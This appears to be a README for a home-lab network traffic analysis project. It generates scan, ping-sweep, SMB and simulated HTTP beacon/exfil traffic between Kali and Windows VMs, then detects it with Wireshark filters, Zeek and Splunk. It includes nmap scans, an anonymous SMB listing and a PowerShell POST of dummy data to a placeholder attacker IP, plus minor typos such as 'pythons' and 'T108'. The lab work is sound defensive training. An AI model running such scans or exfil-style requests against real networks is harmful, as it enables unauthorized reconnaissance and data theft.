 ## ⛓ Network Traffic Analysis (Kali + Windows)
 ### Objective
Capture and analyze network traffic for common attacker behaviors (scan, beacon/HTTP exfil, ICMP sweep, SMB touch) and document detections.

### Lab Topology
- Put Kali and Windows on the same **Host-Only** or Internal network in your hypervisor **(Please see Image 1.1 & 1.2 within the Screenshots folder)**.
- Find IPs **(Please see Image 1.3 & 1.4 within the Screenshots folder)**:
   + Kali: `ip a` (note interface like eth0 or ens33)
     + Kali (attacker/analyst): `<KALI_IP>`
   + Windows: `ipconfig`
     + Windows 10 VM (victim): `<WIN_IP>`

### Tools
- tcpdump / Wireshark (packet capture) 
  + **Kali:** **(Please see Image 2 within the Screenshots folder)**
   ```Bash
   sudo apt update
   sudo apt install -y wireshark tcpdump zeek nmap curl
   ```
  + **Windows:** install **Wireshark (optional) and ensure **PowerShell** is available.

    **Note:** capture on Kali (attacker) while you generate traffic between Kali ↔ Windows.
- Zeek (pcap → structured logs)
- (Optional) Splunk (search/visualize Zeek logs)

### First capture
This is the **Baseline** capture.
#### 1. Method 1: On Kali (replace `eth0` with your interface):

```Bash

Sudo tcpdump -i eth0 -w baseline .pcap
```
Leave this running while you generate traffic (next section). Press **Ctrl+C** to stop and write the file.


#### 2.  Using Wireshark (my preffered option) **(Please Baseline.pcapng in Pcaps folder)**
Start **Wireshark** on Kali → select your interface → click start (blue shar icon) → later click Stop (red square) → Save as `baseline.pcapng`. 


### Scenarios
We’ll do 4 useful, resume-worthy scenarios. Run each while capturing (new pcap per scenario), then stop capture after each.

#### 1. Port scan → `scan_windows.pcapng` (MITRE T1046)

On **Kali:**

See **(Please scan_windows.pcapng in Pcaps folder)** and **(Please see Image 3-4 within the Screenshots folder)**

```bash
Sudo nmap -sS -T4 -p 1-1024 <WINDOWS_IP>

```

Save capture as `scan_windows.pcapng`.
**MITRE:** Discovery (T1046 - Network Service Discovery)
  
#### 2. HTTP beacon/exfil → `http_exfil.pcap` (T1071.001, T1041)
On **Kali**, start a mini web server:

See **(Please http_exfil.pcapng in Pcaps folder)** and **(Please see Image 5-6 within the Screenshots folder)**

```bash
pythons -m http.server 8000

```

On Windows (PowerShell), send a fake “beacon/exfil” POST:

```powershell

Invoke-WebRequest -Uri "http://<KALI_IP>:8000/upload" -Method POST -Body "sample=hello&user=victim1"
Start-Sleep -Seconds 5
Invoke-WebRequest -Uri "http://<KALI_IP>:8000/beat"   -Method GET

```

Stop capture → save as `http_exfil.pcap`.
**MITRE:** Command & Control (T1071.001 - Web Protocols), Exfiltration (T1041 - Exfil over C2 channel)

#### 3. ICMP sweep → `icmp_sweep.pcapng` (T1018)
On **Kali** (pick your /24):

See **(Please icmp_sweep.pcapng in Pcaps folder)** and **(Please see Image 7 within the Screenshots folder)**

```bash

sudo nmap -sn <YOUR_SUBNET>/24

```

Save as `icmp_sweep.pcap`.
**MITRE:** Discovery (T108 - Remote System Discovery)

#### 4. SMB touch → `smb_touch.pcap` (T1135)
From **Kali** (non-auth listing may fail harmlessly but still generates traffic):

See **(Please smb_touch.pcapng in Pcaps folder)** and **(Please see Image 8 within the Screenshots folder)**

```bash
smbclient -L //<WINDOWS_IP>/ -N

```
Save as `smb_touch.pcap`.
**MITRE:** Discovery (T1135 - Network Share Discovery), Lateral Movement (surface only)
Tip: Keep pcaps <50-100 MB; if larger, zip them.

### Quick Wireshark Analysis
Open each .pcapng` in Wireshark and use these **display filters:**

**Port scan**
- SYNs without ACKs (half-open) **(Please see Image 9 within the Screenshots folder)**:
```ini

tcp.flags.syn==1 && tcp.flags.ack==0

```
- Dest port heatmap: Statistics → Endpoints/Conversations.

**HTTP beacon/exfil**
- HTTP POSTs **(Please see Image 11 within the Screenshots folder)**:
```ini

http.request.method == "POST"

```

- All HTTP to Kali **(Please see Image 10 within the Screenshots folder)**:

```ini

ip.dst == <KALI_IP> && http

```

**ICMP sweep**
**(Please see Image 12 within the Screenshots folder)**

```go

icmp && ip.dst==<SUBNET_RANGE> && icmp.type==8

```

**SMB**
**(Please see Image 13 within the Screenshots folder)**
```ini

tcp.port==445 || tcp.port==139

```

Export screenshots: flow graphs (Statistics → Flow Graph), packet details, conversation lists.

### Zeek - Powerful logs from pcapng
**(Please see Image 14.1 within the Screenshots folder)**
```bash
mkdir -p ~/zeek_out/scan ~/zeek_out/http ~/zeek_out/icmp ~/zeek_out/smb
```

**(Please see Image 14.2 within the Screenshots folder and zeek/scan folder for logs)**
```bash
cd zeek_out/scan
zeek -Cr ~/scan_windows.pcapng
ls

```
**(Please see Image 14.3 within the Screenshots folder and zeek/http folder for logs)**
```bash
~
cd zeek_out/http
zeek -Cr ~/http_exfil.pcapng
ls

```
**(Please see Image 14.4 within the Screenshots folder and zeek/icmp folder for logs)**
```bash

cd ~/zeek_out/icmp
zeek -Cr ~/icmp_sweep.pcapng
ls

```
**(Please see Image 14.5 within the Screenshots folder and zeek/smb folder for logs)**
```bash

cd ~/zeek_out/smb
zeek -Cr ~/smb_touch.pcapng
ls

```
You'll get logs like `conn.log`, `http.log`, `ssl.log`, `dns.log` (if present), etc.

**Quick reads**

**(Please see Image 14.5 within the Screenshots folder)**
```bash
# Top 10 destination ports from the scan
cat ~/zeek_out/scan/conn.log | zeek-cut id.resp_p | sort -n | uniq -c | sort -nr | head

# HTTP paths & methods in exfil
cat ~/zeek_out/http/http.log | zeek-cut method host uri | head

# ICMP talkers
cat ~/zeek_out/icmp/conn.log | zeek-cut id.orig_h id.resp_h proto service | grep icmp | head

```
### Splunk the Zeek logs (Optional)
If Splunk is on **Windows VM**, share/copy Zeek logs to Windows (e.g., `C:\lab\zeek\http\...`) and add as a data input:

- Splunk → **Settings → Add Data → Monitor → Files & Directories** → select the Zeek folder.
- Set sourcetype(s) to something like `zeek:conn`, `zeek:http` (or `automatic` to start).

Example searches:
```spl

index=* sourcetype=zeek:conn
| stats count dc(id.resp_p) AS unique_ports BY id.orig_h
| sort -count

```

```spl

index=* sourcetype=zeek:http
| stats count BY method host uri
| sort -count

```

### Evidence
- `pcaps/` (captured traffic)
- `zeek/` (parsed logs)
- `screenshots/` (Wireshark/Splunk)

### Talking point about this project
- **Confidentiality:** Show exfil attempt over HTTP and how you detected it (Zeek HTTP logs, Wireshark POSTs).

- **Integrity:** Explain why structured Zeek logs preserve evidence better than raw pcaps alone.

- **Availability:** Show how scans/sweeps can precede DoS and how you’d baseline normal vs. noisy traffic.
